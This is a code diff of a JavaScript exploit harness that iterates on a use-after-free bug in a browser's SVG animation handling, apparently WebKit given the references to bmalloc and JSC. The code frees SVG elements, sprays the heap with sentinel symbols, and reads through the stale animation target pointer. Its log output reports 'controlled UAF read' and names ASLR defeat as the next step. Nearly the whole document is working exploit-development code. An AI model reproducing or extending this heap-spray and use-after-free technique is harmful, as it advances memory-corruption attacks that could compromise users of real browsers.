+            capturedTarget=e.target;
+        },{once:true});
 
-        // 1. Remove useEl first
-        useEl.remove();
-        // 2. Free sym1 → slot A free, at magazine head
-        sym1.remove();
-        // 3. Exhaust magazine with 2000 syms → they take FRESH slots, not slot A
-        //    slot A stays at magazine head
-        const ss=getSpraySvg();
-        const exhaust=[];
-        for(let i=0;i<EXHAUST;i++){
-            const sp=document.createElementNS(SVG_NS,'symbol');
-            sp.setAttribute('id',`sz_exhaust_${t}_${i}`);
-            sp.setAttribute('viewBox','0 0 100 100');
-            const r=document.createElementNS(SVG_NS,'rect');
-            r.setAttribute('width','1');r.setAttribute('height','1');
-            sp.appendChild(r);
-            ss.appendChild(sp);
-            exhaust.push(sp);
+        const style=document.createElement('style');
+        style.textContent=`@keyframes test{0%{opacity:1}100%{opacity:0}}#css_target{animation:test 0.1s infinite;}`;
+        document.head.appendChild(style);
+
+        await raf();await raf();
+        el.remove();
+        style.remove();
+
+        if(capturedTarget){
+            try{
+                const tag=capturedTarget.tagName;
+                const id=capturedTarget.id;
+                log(`  CSS event ref after remove: tagName=${tag} id=${id}`,'hi');
+            }catch(e){
+                log(`  CSS event ref crash after remove: ${e.message}`,'bad');
+            }
+        }else{
+            log(`  CSS: no animationstart fired within 2 rAFs`,'dim');
         }
-        await raf();
-        // 4. NOW spray sentinel: should get slot A (magazine head)
-        const sentinel=mkSpray(`sz_${t}_sentinel`);
-        ss.appendChild(sentinel);
-        // 5. Re-add useEl
-        livesvg.appendChild(useEl);
-        await raf();
-        // 6. Read through stale ptr
-        let postW=null;
-        try{postW=useEl.getBBox().width;}catch(e){crash++;await teardown();continue;}
-
-        const wHex=f2h(postW);
-        wFreq[wHex]=(wFreq[wHex]||0)+1;
-
-        if(Math.abs(postW-SENTINEL_F)<0.01){hit++;log(`  t${t}: [HIT!] w=${postW.toFixed(4)} ← SENTINEL!`,'bad');}
-        else if(postW===0){miss++;}
-        else{raw++;if(t<4)log(`  t${t}: raw=${postW.toFixed(4)} (${wHex})`,'hi');}
-
-        // Also test ArrayBuffer(384) spray
-        // (Just log the attempt — ArrayBuffer spray reads would need a different read path)
-        await teardown();
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
     }
 
-    log(`\n[*] SZ: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
-    log(`[*] freq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,5).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
-    if(hit>0)log(`[+] SPRAY LANDED via size exhaust after free!`,'bad');
-    else{
-        log(`[*] still missing — possible reasons:`,'inf');
-        log(`  1. slot A is grabbed by sym2's render tree update (sym2 still in DOM)`,'inf');
-        log(`  2. bmalloc LIFO gives exhaust objs the free slot, not fresh slots`,'inf');
-        log(`  3. wrong size class — SVGSymbolElement != 384B on this build`,'inf');
-        log(`  4. useEl.getBBox() no longer follows anim ptr after useEl re-add`,'inf');
+    // Test 2: animateTransform — different from animate (href vs transform)
+    log('\n[*] T2: animateTransform.targetElement UAF','inf');
+    {
+        let hit=0,miss=0,raw=0;
+        const tagFreq={};
+        for(let t=0;t<16;t++){
+            while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+            clearSpray();
+            await raf();await raf();
+
+            const sym1=mkSym1(`wt_${t}`);
+            livesvg.appendChild(sym1);
+
+            const anim=document.createElementNS(SVG_NS,'animateTransform');
+            anim.setAttribute('attributeName','transform');
+            anim.setAttribute('attributeType','XML');
+            anim.setAttribute('type','rotate');
+            anim.setAttribute('values','0;360');
+            anim.setAttribute('dur','0.1s');
+            anim.setAttribute('repeatCount','indefinite');
+            sym1.appendChild(anim);
+
+            await raf();await raf();
+
+            let preTgt=null;
+            try{preTgt=anim.targetElement;}catch(e){}
+            if(!preTgt){await teardown();continue;}
+
+            const SPRAY_COUNT=1024;
+            sym1.remove();
+            const ss=getSpraySvg();
+            for(let i=0;i<SPRAY_COUNT;i++){
+                const sp=document.createElementNS(SVG_NS,'symbol');
+                sp.setAttribute('id',`SENTINEL_wt_${t}_${i}`);
+                const r=document.createElementNS(SVG_NS,'rect');
+                r.setAttribute('width','999');
+                sp.appendChild(r);
+                ss.appendChild(sp);
+            }
+            await raf();
+
+            let postTgt=null,postTag='?',postId='?';
+            try{postTgt=anim.targetElement;}catch(e){}
+            if(!postTgt){miss++;await teardown();continue;}
+            try{postTag=postTgt.tagName;}catch(e){}
+            try{postId=postTgt.id;}catch(e){}
+
+            tagFreq[postTag]=(tagFreq[postTag]||0)+1;
+            if(postId&&postId.includes('SENTINEL')){
+                hit++;
+                log(`  t${t}: [HIT animateTransform!] id=${postId}`,'bad');
+            }else{
+                if(t<3)log(`  t${t}: post tgt=${postTag} id=${postId}`,'dim');
+            }
+
+            await teardown();
+        }
+        const tagStr=Object.entries(tagFreq).map(([k,v])=>`${k}×${v}`).join(' ');
+        log(`  animateTransform: hit=${hit} miss=${miss} tags=[${tagStr}]`,hit>0?'bad':'dim');
+    }
+
+    // Test 3: animate with fill="freeze" — ptr kept alive longer?
+    log('\n[*] T3: animate fill=freeze — ptr lifetime different?','inf');
+    {
+        let hit=0,miss=0;
+        const tagFreq={};
+        for(let t=0;t<12;t++){
+            while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+            clearSpray();
+            await raf();await raf();
+
+            const sym1=mkSym1(`wf_${t}_s1`);
+            const sym2=mkSym2(`wf_${t}_s2`);
+            livesvg.appendChild(sym1);livesvg.appendChild(sym2);
+
+            const useEl=document.createElementNS(SVG_NS,'use');
+            useEl.setAttribute('href',`#wf_${t}_s1`);
+            const anim=document.createElementNS(SVG_NS,'animate');
+            anim.setAttribute('attributeName','href');
+            anim.setAttribute('values',`#wf_${t}_s1;#wf_${t}_s2`);
+            anim.setAttribute('dur','0.2s');
+            anim.setAttribute('fill','freeze'); // frozen at end value
+            // no repeatCount — runs once and freezes
+            useEl.appendChild(anim);
+            livesvg.appendChild(useEl);
+
+            // Wait for animation to complete and freeze
+            await raf();await raf();await raf();await raf();
+
+            let preTgt=null;
+            try{preTgt=anim.targetElement;}catch(e){}
+
+            // Now remove sym1 — animation is frozen at sym2
+            useEl.remove();
+            sym1.remove();
+
+            // Spray
+            const ss=getSpraySvg();
+            for(let i=0;i<1024;i++){
+                const sp=document.createElementNS(SVG_NS,'symbol');
+                sp.setAttribute('id',`SENTINEL_wf_${t}_${i}`);
+                const r=document.createElementNS(SVG_NS,'rect');r.setAttribute('width','999');
+                sp.appendChild(r);ss.appendChild(sp);
+            }
+            livesvg.appendChild(useEl);
+            await raf();
+
+            let postTgt=null,postTag='?',postId='?';
+            try{postTgt=anim.targetElement;}catch(e){}
+            if(!postTgt){miss++;await teardown();continue;}
+            try{postTag=postTgt.tagName;}catch(e){}
+            try{postId=postTgt.id;}catch(e){}
+
+            tagFreq[postTag]=(tagFreq[postTag]||0)+1;
+            if(postId&&postId.includes('SENTINEL')){
+                hit++;
+                log(`  t${t}: [HIT fill=freeze!] id=${postId}`,'bad');
+            }else if(t<3){
+                log(`  t${t}: tgt=${postTag} id=${postId}`,'dim');
+            }
+
+            await teardown();
+        }
+        const tagStr=Object.entries(tagFreq).map(([k,v])=>`${k}×${v}`).join(' ');
+        log(`  fill=freeze: hit=${hit} miss=${miss} tags=[${tagStr}]`,hit>0?'bad':'dim');
     }
 
     if(!q)dis(false);
-    return{hit,miss,raw,crash};
 }
 
 // ── RUN ALL ───────────────────────────────────────────────────────────────
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG animate UAF v12 — spray timing fix','inf');sep();
-    log('[*] v11: JSC bridge sanitizes confused ptr → returns correct useEl wrapper','ok');
-    log('[*] v12: detach useEl BEFORE free → stop internal alloc from grabbing slot','ok');
-    log('[*] sentinel: width=999 (0x44799000) — hits = controlled UAF read','ok');log('');
+    log('▶ SVG animate UAF v13 — immediate read + standalone + alt spray','inf');sep();
+    log('[*] v12: ST miss=32 raw=0 — slot zeroed before read (bmalloc fast zero)','ok');
+    log('[*] v12: 80.0 was live useEl geometry, not freed sym1 memory','ok');
+    log('[*] v13: find which approach lets JS spray WIN the slot race','ok');log('');
     const R={};
     for(const[lbl,fn]of[
-        ['ST_spray_timing',runST],
-        ['GC_gc_pressure',runGC],
-        ['MC_message_channel',runMC],
-        ['SZ_size_exhaust_v2',runSZ],
+        ['IR_immediate_read',runIR],
+        ['SA_standalone_anim',runSA],
+        ['AT_alt_spray_types',runAT],
+        ['WR_write_then_read',runWR],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
         try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
         log('');
     }
-    sep();log('▶ SUMMARY v12','inf');sep();
-    let totalHits=0;
+    sep();log('▶ SUMMARY v13','inf');sep();
+    log('[*] IR: if live>0 — stale ptr IS read before slot reused (timing window exists)','inf');
+    log('[*] SA: standalone anim removes useEl contention — best spray chance','inf');
+    log('[*] AT: which element type matches sym1 size class → spray with that type','inf');
+    log('[*] WR: animateTransform / fill=freeze might have longer-lived stale ptr','inf');
     for(const[lbl,r]of Object.entries(R)){
-        const h=r?.hit??0;totalHits+=h;
-        log(`  ${lbl}: hit=${h} miss=${r?.miss??'?'} raw=${r?.raw??'?'}`,h>0?'bad':'dim');
-    }
-    if(totalHits>0){
-        log('\n[+] SPRAY HIT CONFIRMED — controlled UAF read achieved','bad');
-        log('[+] next: write ptr into spray object, read via stale ptr → ASLR defeat','bad');
-    }else{
-        log('\n[*] spray still not landing — try different approach','inf');
-        log('[*] KEY DIAGNOSTIC: what values did ST show in raw?','inf');
-        log('[*] if raw=0 and miss dominates: stale ptr is being nulled (different bug)','inf');
-        log('[*] if raw>0 with non-999 values: slot reused by something we can identify','inf');
+        if(r)log(`  ${lbl}: ${JSON.stringify(r).slice(0,120)}`,'dim');
     }
     sep();dis(false);
 }
